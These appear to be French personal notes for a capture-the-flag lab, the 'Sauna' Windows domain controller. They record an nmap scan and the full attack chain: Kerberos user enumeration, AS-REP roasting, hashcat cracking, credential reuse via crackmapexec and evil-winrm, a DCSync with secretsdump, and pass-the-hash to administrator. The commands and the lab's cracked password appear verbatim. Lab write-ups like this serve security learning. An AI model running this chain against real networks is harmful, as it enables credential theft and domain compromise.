@@ -1,0 +1,133 @@
+***** SAUNA
+
+****** Scan Nmap
+resultat : 10.10.10.175
+
+PORT      STATE SERVICE       VERSION
+53/tcp    open  domain        Simple DNS Plus
+80/tcp    open  http          Microsoft IIS httpd 10.0
+| http-methods: 
+|_  Potentially risky methods: TRACE
+|_http-server-header: Microsoft-IIS/10.0
+|_http-title: Egotistical Bank :: Home
+88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2022-03-25 02:49:21Z)
+135/tcp   open  msrpc         Microsoft Windows RPC
+139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name)
+445/tcp   open  microsoft-ds?
+464/tcp   open  kpasswd5?
+593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+636/tcp   open  tcpwrapped
+3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name)
+3269/tcp  open  tcpwrapped
+5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+9389/tcp  open  mc-nmf        .NET Message Framing
+49667/tcp open  msrpc         Microsoft Windows RPC
+49673/tcp open  msrpc         Microsoft Windows RPC
+49674/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+49677/tcp open  msrpc         Microsoft Windows RPC
+49689/tcp open  msrpc         Microsoft Windows RPC
+49696/tcp open  msrpc         Microsoft Windows RPC
+Service Info: Host: SAUNA; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+|_clock-skew: 7h00m01s
+| smb2-security-mode: 
+|   2.02: 
+|_    Message signing enabled and required
+| smb2-time: 
+|   date: 2022-03-25T02:50:11
+|_  start_date: N/A
+
+
+****** script NSE : Script complementaire pour nmap en fonction des services (/usr/share/nmap/script)
+****** On peut essaez :
+	smbclient et smbmap (rien ici)
+
+**** On regarde le port 389 avec le LDAP
+	nmap --script "lmap*" -p 389 10.10.10.175
+	resultat : ldapScripNmap.txt
+
+**** On remarque :
+	Nom de la page de l'equipe correspond a un nom dans le ldap (mais ca suffit pas)
+	brute force possible
+
+	(CN = Computer Name et DN = Domain Name)
+	"Le DN est l'identifiant d'une entrée LDAP. C'est un chemin dans l'arborescence de l'annuaire (Distinguished Name)
+	Le CN (Common Name) est le nom "court""
+
+https://rioasmara.com/2020/07/04/kerberoasting-as-req-pre-auth-vs-non-pre-auth/
+
+https://youtu.be/Z32UhxE29LU?t=1436 +> A voir
+
+
+**** On peut créer une word list :
+**** On utilise kerbrute (a voir)
+**** 1 / Kerbrute sur le domqin "EGOTISTICQL-BANK.LOCAL" qvec liste USER public
+**** je suis perdu ici
+**** On a des user valide
+****
+**** 2 / Autre solution avec les noms et les conventiosn de nomage on fait notre propre wordlist
+**** On regarde les bonnes methode de nomage de AD (premiere lettre prenom + nom)
+**** list d'utilisateur a tester qavec Kerbrute
+
+**** On utilise GetNPuser.py (a revoir)
+
+**** GetNPuser.py DOMAIN -userfile /path/userlist -dc-ip IPMACHINE
+
+**** On trouve un client : fsmith avec le Hash
+
+---- https://github.com/noraj/haiti (autre ckaker de hash)
+
+**** $23 => algo utilisé (ici RC4)
+**** 18200 => kerberos
+**** hashcat => hashcat -m 18200 hash.txt -w /usr/share/rockyou.txt
+**** MDP trouvé : Thestrockes23
+	crackmapexec couteau suisse (post-exploit)
+**** on utilise : 	
+└─# crackmapexec smb 10.10.10.175 -u fsmith -p Thestrokes23 --shares 
+SMB         10.10.10.175    445    SAUNA            [*] Windows 10.0 Build 17763 x64 (name:SAUNA) (domain:EGOTISTICAL-BANK.LOCAL) (signing:True) (SMBv1:False)
+SMB         10.10.10.175    445    SAUNA            [+] EGOTISTICAL-BANK.LOCAL\fsmith:Thestrokes23 
+SMB         10.10.10.175    445    SAUNA            [+] Enumerated shares
+SMB         10.10.10.175    445    SAUNA            Share           Permissions     Remark
+SMB         10.10.10.175    445    SAUNA            -----           -----------     ------
+SMB         10.10.10.175    445    SAUNA            ADMIN$                          Remote Admin
+SMB         10.10.10.175    445    SAUNA            C$                              Default share
+SMB         10.10.10.175    445    SAUNA            IPC$            READ            Remote IPC
+SMB         10.10.10.175    445    SAUNA            NETLOGON        READ            Logon server share 
+SMB         10.10.10.175    445    SAUNA            print$          READ            Printer Drivers
+SMB         10.10.10.175    445    SAUNA            RICOH Aficio SP 8300DN PCL 6                 We cant print money
+SMB         10.10.10.175    445    SAUNA            SYSVOL          READ            Logon server share 
+
+
+**** Rien ici :(
+---- evil-winrm tres puissant  => https://www.it-connect.fr/powershell-remoting-avec-winrm/
+---- https://github.com/Hackplayers/evil-winrm => un super PowerShell
+**** On regarde le port 5985 / 5986 (WinRM)
+
+**** evil-winrm -u User et -p MDP -i IP => evil-winrm -u fsmith -p Thestrokes23 -i 10.10.10.175
+**** On recupere le user.txt : *Evil-WinRM* PS C:\Users\FSmith\Desktop> cat user.txt
+
+**** winpeas :
+**** upload path/winPEQSany.exe
+**** updog : https://github.com/sc0tfree/updog  => pour upload un serveur (python mqis en https)
+
+**** On trouve les credential AUTOLOGIN
+**** evil-winrm avec ces credentials
+
+**** suite : Impacket /usr/share/doc/python3-impacket/examples
+**** ./secretsdump.py -just-dc EGOTISTICAL-BANK.LOCAL/svc_loadmgr:"MDP"@10.10.10.175
+
+**** on a le hash de l'admin
+**** ./psexec.py -hashes HASHadmin -dc-ip 10.10.10.175 administrator@10.10.10.175
+**** ou
+**** evil-winrm -i 10.10.10.175 -u qdministrqtor -H HASHadmin
+**** On est co : on recupere le flag
+
+**** on utilise GetNPUser.py
+
+**** 
+
+
